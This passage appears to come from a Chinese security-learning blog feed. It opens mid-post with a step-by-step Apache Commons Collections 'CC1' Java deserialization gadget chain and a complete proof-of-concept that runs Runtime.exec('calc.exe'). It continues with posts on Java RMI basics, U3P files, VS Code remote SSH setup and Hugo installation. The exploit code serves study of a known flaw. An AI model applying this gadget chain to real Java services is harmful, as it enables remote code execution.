39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 运行发现报错\n构造正确的AnnotationInvocationHandler 1 2 3 4 5 6 //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); Object obj = construct.newInstance(Annotation.class, outerMap); 第六行的Annotation.class报错，代表不能随便放入class。Annotation.class来自java.lang.annotation包，所以全局搜索@interface\n搜索@interface是因为这是Annotation.class的继承方式\n有如下几个，所以挑选一个，例如Native.class尝试，报错解决，进入下一个报错\n解决不可反序列化 发现报错\n1 Exception in thread \u0026#34;main\u0026#34; java.io.NotSerializableException: java.lang.Runtime Runtime不支持反序列化，没有实现反序列化接口java.io.Serializable，所以使用反射获取Runtime类对象，于是修改\n1 new ConstantTransformer(Runtime.getRuntime()), 为\n1 2 3 4 5 6 7 8 new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), 以获取Runtime示例对象\n此后完整代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); // innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Annotation.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 解决BUG 无法进入for循环 但此时依旧无法触发RCE的执行，为什么，让我们跟踪一下数据执行流\n发现这一行for循环并不能取出值来进入循环\n所以我们需要在memberValues里面，即outerMap里添加键值对来进入循环\n我们发现如果代码在设置TransformedMap这一步里的outermap添加键值对，会直接导致RCE触发，但不是经过反序列化，而是回到了手动触发的方式。\n1 2 3 4 5 //设置TransformedMap Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); 所以我们采用，在innerMap里添加，这样就能保证计算器不会在没有触发反序列化payload的地方出现，如下\n无法进入if判断 如图，即使进入for循环后，还是无法到达memberValue.setValue这条触发语句，memberType需要不为null\nmemberType来源于memberTypes.get(name)，name为str变量，值为aaa，即我们输入的Key值，memberTypes来源于\n1 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); 可以看到在Debug情况下，size=0，即没有从annotationType.memberTypes()中取出有效值。\nannotationType.memberTypes()源码如下\n1 2 3 public Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes() { return memberTypes; } 直接返回memberTypes，看定义\n1 private final Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes; final类型，代表只有初始化赋值，查看初始化赋值\n1 2 3 4 5 6 7 8 9 Method[] methods = AccessController.doPrivileged(new PrivilegedAction\u0026lt;Method[]\u0026gt;() { public Method[] run() { // Initialize memberTypes and defaultValues return annotationClass.getDeclaredMethods(); } }); memberTypes = new HashMap\u0026lt;String,Class\u0026lt;?\u0026gt;\u0026gt;(methods.length+1, 1.0f); 来自于methods，methods会去getDeclaredMethods()，获取声明的所有Methods，所以如果类没有声明方法，memberTypes.size始终为0。\n上文搜索到的定义类中，只有Repeatable.class，Retention.class，Target.class具有方法\n所以构造Native.class无法满足条件，换成Repeatable.class试试\n完整源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;aaaaa\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 发现还是无法进入if语句，因为取值的时候，没有Key值为aaa的选项，所以将aaa改为value试试\n成功触发\n完整POC Demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Repeatable; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonC2dm { public static void main(String[] args) throws Exception { //设置ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); //设置TransformedMap Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;bbbbb\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //构造AnnotationInvocationHandler Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // Object obj = construct.newInstance(Retention.class, outerMap); Object obj = construct.newInstance(Repeatable.class, outerMap); //序列化对象 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); //手动触发反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } 缺陷-Java高版本无法利用 大佬说\n我们是在Java 8u71以前的版本上进行测试的，在8u71以后大概是2015年12月的时候，Java官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数\n修改后，我们精心构造的outerMap不会再有set，put操作，就不会触发transform()，自然也就失效了\n如何破局 仔细对比ysoserial中的CC1和我们的CC1 Demo大有不同，我们将在下一章进行知识的补充与学习\n","date":"2024-07-21T15:58:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/cc1demo/","title":"CC1Demo"},{"content":"什么是RMI RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。\nServer 端通常会创建一个对象，并使之可以被远程访问。\n这个对象被称为远程对象。Server 端需要注册这个对象可以被 Client 远程访问。\nClient 端调用可以被远程访问的对象上的方法，Client 端就可以和 Server 端进行通信并相互传递信息。\nRMI 在构建一个分布式应用时十分方便，它和 RPC 一样可以实现分布式应用之间的互相通信，甚至和现在的微服务思想都十分类似。\nRMI (Remote Method Invocation) 分布式对象应用的设计可以方便项目的解耦，和微服务，RPC相关思想如出一辙。\nRMI和RPC的不同点呢？\nRPC是一种思想，一种类似协议的约定，只要是通过网络从而调有远端的某种服务，那么这就是RPC\nRMI可以说是Java对RPC的具体实现，或说RMI是RPC的java版的细化要求\nJava中所有东西皆是对象，所以没有函数，只有方法（绑定了对象）所以RPC的解释是面向过程的，RMI的解释是面向对象的\n不管是何种实现，本质都是为了解决一个问题：我想要调用远程的一个函数或者方法或者其他什么东西的时候，我只需要像调用本地的一样，即可。\n知识补充 补充：RPC？\nRPC是远程过程调用（Remote Procedure Call） RPC 的主要功能目标是让构建分布式计算（应用）更容易，在提供强大的远程调用能力时不损失本地调用的语义简洁性。为实现该目标，RPC 框架需提供一种透明调用机制，让使用者不必显式的区分本地调用和远程调用。\nRPC的出现可以使得程序直接像调用本地函数一样调用远程的方法，如果调用远程方法时设计到的传入参数是一个实例化对象，那么就会涉及到序列化与反序列化。\n比如需要将Apple a 中的 name 成员变量提取处理后返回处理后的Apple a1\n一次完整的RPC逻辑\n到此，完整的rpc逻辑应该就是这样的：\nclient进行connect连接 （创建连接，如果需要可靠第一，就选择TCP连接） client序列化req（否则无法传输） client根据约定的协议编码，向server发送编码后的数据（编码是为了防止传输出错） server接收到数据，解码得到方法名和序列化过后的req二进制流 server根据方法名找到req的类型，反序列化得到req对象 server调用本地方法得到res server序列化res server根据约定的协议编码并发送数据 client接收到数据并解码 client反序列化得到res RMI是怎么设计的 RMI 中是通过在客户端的Stub对象作为远程接口进行远程方法的调用。 每个远程方法都具有方法签名。 如果一个方法在服务器上执行，但是没有相匹配的签名被添加到这个远程接口(stub)上，那么这个新方法就不能被RMI客户方所调用。\n基本流程图：\n从图中可以看到，Client 端有一个被称 Stub 的东西，有时也会被成为存根，它是 RMI Client 的代理对象，Stub 的主要功能是请求远程方法时构造一个信息块，RMI 协议会把这个信息块发送给 Server 端。\n这里可以了解到的东西\nClient被Stub（存根）代理，所以 Client 眼中只有 Stub。即相对于Client，具体实现细节被Stub隐藏。 Stub 会请求远程方法，并在这时发送一个信息块 信息块是Stub构造的 这个信息块由几个部分组成：\n远程对象标识符。 调用的方法描述。 编组后的参数值（RMI协议中使用的是对象序列化） 尝试理解这个信息块的话，信息块内容的作用分别为\n尝试指定一个唯一的对象 指定唯一方法 传递参数（参数如果是对象的话 \u0026ndash; 其实JAVA里万物皆对象 \u0026ndash; 需要序列化对象） 如果在本地调用的话容易实现，远程调用就需要指定唯一性\n1 2 3 4 随学的疑问？ 1. 可以指定静态类吗？ 2. 一定要确定是某一个对象才可以吗 3. 如果2成立，是由于该对象特殊？是因为他注册了?（设置了可以对外） 2和3的解答\n既然 Client 端有一个 Stub 可以构造信息块发送给 Server 端，那么 Server 端必定会有一个接收这个信息快的对象，称为 Skeleton\n它主要的工作是：\n解析信息快中的调用对象标识符和方法描述，在 Server 端调用具体的对象方法。 取得调用的返回值或者异常值。 把返回值进行编组，返回给客户端 Stub. 这里可以了解到的东西\nServer端有一个接受信息块的东西称之为 Skeleton Skeleton 也可能是作为Server端的代理，对Server隐藏实现细节 Skeleton 获得信息块后，取出值交给Server端，并从Server端获得结果（可能是返回值，异常值） Skeleton 对相关结果进行 编码 发送回Client端 所以，RMI的整个工作流程即为\nRMI工作流程 首先，服务器创建一个远程对象并将其注册到注册表中（注册表中写入Stub） 客户端可以获取注册表中存储的对象的引用（Stub） 当客户端调用远程对象的方法时，实际上会在与客户端 JVM 在同一 JVM 中的存根对象（Stub）上调用该方法。 存根对象（Stub）会创建一条消息，其中包含方法的名称以及其参数（称为封装），并将此消息发送到位于服务器 JVM 中的相关骨架对象（Skeleton）。 骨架对象（Skeleton）会从消息中提取方法名和参数（称为解封装），并调用与其关联的远程对象上的适当方法。 远程对象执行该方法并将返回值传回骨架对象（Skeleton）。 骨架对象（Skeleton）再将返回值封装在消息中并将此消息发送到存根对象（Stub）。 存根对象（Stub）从消息中解封装返回值，并将该值返回给客户端程序 看到这里有读者或许会有疑惑：Stub不是在Client端的吗，为什么和服务器沾边了？\nStub是Client使用，但是是由Server端创建的，Client 在第一次尝试远程调用前需要通过网络在注册表中取出Stub，之后的再次使用就可以不再重复此过程，直接使用本地已经获取的Stub即可\n注意：解答中的Stub可复用的前提是Client端只需要远程调用一个对象，如果需要调用多个不同类对象的话，每个类对象在第一次调用前需要获得Stub\n相关术语总结\nRMIRegistry RMI注册表，RMIServer负责将stubs（存根）注册到RMIRegistry，RMIClient从RMIRegistry获取stubs（存根）。 RMIServer RMIServer负责创建Remote Object（远程对象），并将之导出到 JAVA RMI runtime，远程对象必须被导出到JAVA RMI runtime，这样该远程对象才能接受远程调用。 RMIClient RMIClient负责发起远程方法调用。 Remote Object RMIServer负责创建Remote Object（远程对象），并将之导出到 JAVA RMI runtime。 stubs（存根） JAVA RMI使用一种特殊的类（这些类被称作stubs）来发起对远程对象的方法调用。远程对象导出的结果形成了这种特殊的类（stubs）。stubs与Remote Object实现的接口是一样的，并且包含hostname和port，hostname和port与Remote Object能够形成对应关系。stubs实例实际上就是Remote Object（远程对象） RMI代码实现 假设需求：Client 端需要查询用户信息，而用户信息存在于 Server 端，所以在 Server 端开放了 RMI 协议接口供客户端调用查询，返回是一个对象\n所以Client调用前需要：\nServer开放RMI协议接口 RMI Server Server 端主要是构建一个可以被传输的类 User，一个可以被远程访问的类 UserService，同时这个对象要注册到 RMI 开放给客户端使用。\n首先User类需要被传输，所以需要继承 Serializable，使得对象可以被序列化，序列化后的对象才能传输。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package com.wdbyte.rmi.server; import java.io.Serializable; public class User implements Serializable { private static final long serialVersionUID = 6490921832856589236L; private String name; private Integer age; private String skill; public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public String getSkill() { return skill; } public void setSkill(String skill) { this.skill = skill; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, skill=\u0026#39;\u0026#34; + skill + \u0026#39;\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } User类只是作为可以传输数据的存在，需要一个类来进行远程通信，通信传输的是User类的实例化对象\n所以设计一个UserService类\n但这种类不是随意实现的，这种类的具体实现官方给了相关规范：\n需要先设置一个接口，再有一个类实现这个接口\n所以需要先设计接口\n所以有\nUserService 接口 官方对此类接口的规定：需要继承 Remote 类，方法需要抛出 RemoteException\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package com.wdbyte.rmi.server; import java.rmi.Remote; import java.rmi.RemoteException; public interface UserService extends Remote { /** * 查找用户 * * @param userId * @return * @throws RemoteException */ User findUser(String userId) throws RemoteException; } 其次需要设计一个实现了接口的类\nUserServiceImpl 接口实现类 官方对实现类的规定：需要继承 UnicastRemoteObject 类，且需要实现刚才定义的接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package com.wdbyte.rmi.server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class UserServiceImpl extends UnicastRemoteObject implements UserService { protected UserServiceImpl() throws RemoteException { } @Override public User findUser(String userId) throws RemoteException { // 加载在查询 if (\u0026#34;00001\u0026#34;.equals(userId)) { User user = new User(); user.setName(\u0026#34;金庸\u0026#34;); user.setAge(100); user.setSkill(\u0026#34;写作\u0026#34;); return user; } throw new RemoteException(\u0026#34;查无此人\u0026#34;); } } 最后是进行通信的主程序的设计 指定对象作为远程访问对象（也叫注册），设置相关参数（比如设置访问端口）\n服务端绑定 UserService 对象作为远程访问的对象，启动时端口设置为 1900\n解答：代码中设置了具体对象url和对应绑定端口的，所以指定URL路径和端口，可以理解为唯一对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.wdbyte.rmi.server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RmiServer { public static void main(String[] args) { try { UserService userService = new UserServiceImpl(); LocateRegistry.createRegistry(1900); Naming.rebind(\u0026#34;rmi://0.0.0.0:1900/user\u0026#34;, userService); System.out.println(\u0026#34;start server,port is 1900\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 新疑问：\n这里为什么没有绑定 UserServiceImpl 对象而是 UserService\nLocateRegistry.createRegistry(1900);这里的1900需要和Naming.rebind(\u0026quot;rmi://localhost:1900/user\u0026quot;, userService);中的1900对应吗\n（是的，详见这里，所以第一步是启动RMI Registry，第二步绑定的时候需要寻找到RMI Registry）\n整个Server端的设计是：\n主程序使用设计好的通信类 通信类使用设计好的可序列化对象进行传输 之后是Client端\nRMI Client Client 端简单的多。直接引入可远程访问和需要传输的类，通过端口和 Server 端绑定的地址，就可以发起一次调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package com.wdbyte.rmi.client; import java.rmi.Naming; import com.wdbyte.rmi.server.User; import com.wdbyte.rmi.server.UserService; public class RmiClient { public static void main(String args[]) { User answer; String userId = \u0026#34;00001\u0026#34;; try { // lookup method to find reference of remote object UserService access = (UserService)Naming.lookup(\u0026#34;rmi://localhost:1900/user\u0026#34;); answer = access.findUser(userId); System.out.println(\u0026#34;query:\u0026#34; + userId); System.out.println(\u0026#34;result:\u0026#34; + answer); } catch (Exception ae) { System.out.println(ae); } } } 疑问：\nClient此处的User类和UserService接口如何确保和远端的User类相同？（可选方案：提前商议，或者默认信任） 运行测试 运行RmiServer.java和RmiClient.java\nServer\nClient\nClient 查询不存在（修改userID变量）\n补充 解答，见补充1\nRmiRegistry 是需要启动的，如果没有注册表，那么服务端无法存入Stub RmiRegistry 可以单独使用命令启动，也可以使用代码启动\n1 2 Windows C:\\Users\\love1\u0026gt;start rmiregistry 2001 1 2 Linux $ rmiregistry -J-D=java.rmi.server.codebase=/home/d4n 2001 1 2 3 //java代码 LocateRegistry.createRegistry(2001); //Registry使用2001端口，默认启动端口1099 获取 RmiRegistry 中的实例对象（Stub） 1 Registry registry = LocateRegistry.getRegistry(\u0026#34;127.0.0.1\u0026#34;, 20001); //获取Registry 但是上个例子中使用的是Naming.lookup，Naming.lookup只是封装了相关查询，所以底层还是LocateRegistry.getRegistry\nRMI 的另一个例子 RMI Server\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.vulhub.RMI; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } //多了一步父类的初始化，代码逻辑不变 public String hello() throws RemoteException { System.out.println(\u0026#34;call from\u0026#34;); return \u0026#34;Hello world\u0026#34;; } } private void start() throws Exception { RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind(\u0026#34;rmi://0.0.0.0:1099/Hello\u0026#34;, h); //如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ： //Naming.bind(\u0026#34;Hello\u0026#34;, new RemoteHelloWorld()); 即可 } public static void main(String[] args) throws Exception { new RMIServer().start(); } } RMI Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package org.vulhub.Train; import org.vulhub.RMI.RMIServer; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; public class TrainMain { public static void main(String[] args) throws Exception { RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming .lookup(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); String ret = hello.hello(); System.out.println(ret); } } 这个例子的每行代码都很清晰的话，说明已经理解RMI的代码实现了\nRMI通信流量 此图为大佬的RMI通信纯净的流量截图，其中 135.1 为Client 135.142 为Server\n可以看到整个通信是有两次TCP连接的：\n第一次是Client连接 Server 的1099端口 第二次是Client 连接 Server 的 33769 端口 第二次的端口号存在于第一次的ReturnData中。\n最后远程的方法执行是在RMI Server中执行，第二个例子中的System.out.println(\u0026quot;call from\u0026quot;);即可证明\n解决疑问 1.Client访问静态类方法？\n","date":"2024-04-08T17:29:24+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240409172707180.png","permalink":"https://d4n-sec.github.io/p/rmi-study/","title":"Rmi Study"},{"content":"什么是u3p文件 .u3p 文件是存储在U3智能驱动器（一种特殊类型的USB闪存驱动器，包括U3 Launchpad平台）上的便携式应用程序。它包含程序可执行文件和配置数据。如果需要在计算机上运行某些文件，请在计算机上运行一些文件。\n1 A U3P file is a portable application stored on a U3 Smart Drive, a special type of USB flash drive that includes the U3 Launchpad platform. It contains program executables and configuration data. U3P files enable a program to be run from the flash drive on any Windows computer and may install some files on the local computer if needed. 其中提及的 U3 Smart Drive （U3智能驱动器）是一种特殊的U盘，相关创建或者推动组织试图建立一个新标准的软硬件开发平台，但相关技术已经在2009年年底开始逐步淘汰并停止U3技术支持。\n详细说明 .U3P 文件以压缩.ZIP 格式保存。它们可能包含四个目录：data\\、device\\、host\\、manifest\\。主机\\目录包含.EXE 文件。manifest\\目录保存应用程序配置信息（.U3I 文件）和程序图标。\n如下实例为wireshark的u3p安装包\n修改后缀为zip后直接解压缩即可\n1 通常情况下，由SanDisk、Verbatim、Kingston、Memorex和Intuix等制造商将U3 Launchpad安装到U3智能驱动器上。但是，要手动安装.U3P 启动板，请下载并运行U3 Launchpad安装程序，该安装程序可从SanDisk免费获得。可以使用SanDisk的Launchpad移除工具从USB闪存驱动器中删除U3 Launchpad程序。 当USB闪存驱动器插入计算机的USB端口时，U3启动板程序运行。.U3P 程序可从类似于Windows“开始”菜单的用户界面中使用。\n注意：SanDisk U3 Launchpad已停止使用，不再进行维护。\n","date":"2024-04-07T11:03:04+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240407111740164.png","permalink":"https://d4n-sec.github.io/p/about_u3p/","title":"About_u3p"},{"content":"前言 笔者目前有两个电脑，一个A在家（高性能），一个B在公司（较低性能），如何同步两个电脑的环境一直是一个问题，较低性能的笔记本写文档完全没问题，但是如果涉及一些工具编译，多台虚拟机同时使用，不可。上传github需要push，但是笔者并没有良好的push习惯。相反，只需要git作为存储单元的笔者深受其git版本控制的困扰，git方案失败，有向日葵这样的远控软件但是远控在免费使用的情况下，并不能做到合二为一的感受（延迟）\n解决方案 目前使用高性能在家电脑作为服务端，笔记本作为客户端，所有代码位于在家电脑 build and run，客户端只需要联网+vscode即可实现所有项目共享\n工具 1.蒲公英（内网搭建工具）\n方便，免费。个人免费额度为三台电脑组成一个内网，个人用户完全足够\n2.ssh\nvscode远程连接需要使用\n3.客户机（B）安装 vscode\n安装 提前安装向日葵作为辅助软件，在远程安装前期和后续出现问题时，向日葵会更加有应急作用\n蒲公英正常安装即可，两台电脑同时登录同一账号，即可完成组网。 测试：远端与本地端均关闭防火墙后互ping（IP地址可以在蒲公英软件上查看），互通即互连\nssh windows 安装，windows打开设置，找到应用和功能，在可选功能中找到 Openssh 服务端 和 客户端 远端一定安装服务端，本地端一定安装客户端（好像服务端和客户端合并了？） 然后开启ssh服务开机自启，两端均需要\n依次点击：开始菜单 \u0026ndash; Windows Administrative Tools \u0026mdash; Services，打开 Services 窗口 在里面找到 OpenSSH Authentication Agent，在上面单击右键，选择“属性”，将 Startup type 改为 Automatic 、Automatic(Delayed Start) 或 Manual，并点击 Service status 下的 Start 按钮。\n然后测试ssh连接ssh 用户名@IP 如果出现输入密码界面，即完成\n为方便后续vscode使用，可以设置公私钥连接，教程很多，但是有注意事项\n服务端要开启使用公钥连接，并且注释掉配置文件的最后两行 客户端的公钥赋值添加到.ssh/authorized_keys中，没有创建，有的话追加 为了安全起见，最好关闭密码登录 记得修改客户端的配置文件，指定私钥路径 之后使用vscode的ssh连接直接连接即可\n","date":"2024-03-06T17:38:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306174015000.png","permalink":"https://d4n-sec.github.io/p/vscode/","title":"Vscode Windows 远程连接"},{"content":"前言 Hugo 搭建其实和hexo差不多，但是介于作者有幸尝试过hexo编译大量文章的经历，可以说hexo的性能已经无法满足我对个人博客的向往，于是乎转Hugo，Hugo 基于Go开发，效率方面毋庸置疑，但是由于该工具出现时间短暂，目前参考资料少，所以笔者在这通过搭建做一些总结\nHugo 安装 Hugo 下载 Hugo 的 github 主页找到Releases，根据个人喜好安装Hugo对应版本，建议 hugo_extended 版本的安装，有额外功能（虽然读者可能根本用不上），但因笔者安装使用此，固推荐，具体异同可以参考这个Issues\nHugo 安装 安装时选择任意文件夹，但基于程序员的严谨，不建议安装在含有中文的路径上。之后读者需自行配置安装路径到系统变量（Path）中，如果cmd中Hugo 命令成功识别，此步即完成\n1 2 PS D:\\Home\\Hugo_Blog\u0026gt; hugo version hugo v0.123.7-312735366b20d64bd61bff8627f593749f86c964+extended windows/amd64 